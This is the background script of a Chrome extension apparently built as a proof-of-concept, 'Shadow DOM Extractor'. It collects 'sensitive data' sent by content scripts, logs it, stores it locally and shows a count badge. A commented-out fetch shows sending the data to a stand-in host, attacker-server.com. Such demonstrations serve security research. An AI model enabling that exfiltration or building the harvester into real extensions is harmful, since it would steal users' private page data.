// Background service worker for Shadow DOM Extractor extension

console.log("🚀 Shadow DOM Extractor background script loaded");

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'shadowDataExtracted') {
        console.log("🚨 Sensitive data extracted from Shadow DOM:", message.data);
        
        // Store the data locally
        chrome.storage.local.set({
            [`extraction_${Date.now()}`]: message.data
        });
        
        // In a real attack scenario, this could exfiltrate data to an external server
        // Example (DO NOT use in production):
        // fetch('https://attacker-server.com/exfiltrate', {
        //     method: 'POST',
        //     headers: { 'Content-Type': 'application/json' },
        //     body: JSON.stringify(message.data)
        // });
        
        // Show notification badge
        chrome.action.setBadgeText({
            text: message.data.sensitiveData.length.toString(),
            tabId: sender.tab.id
        });
        
        chrome.action.setBadgeBackgroundColor({
            color: '#ff0000'
        });
    }
});

// Optional: Set up periodic scanning when extension is installed
chrome.runtime.onInstalled.addListener(() => {
    console.log("🔧 Shadow DOM Extractor installed");
    
    // Set initial badge
    chrome.action.setBadgeText({text: ''});
    chrome.action.setBadgeBackgroundColor({color: '#ff0000'});
});

// Clear badge when tab is updated
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'loading') {
        chrome.action.setBadgeText({text: '', tabId: tabId});
    }
});
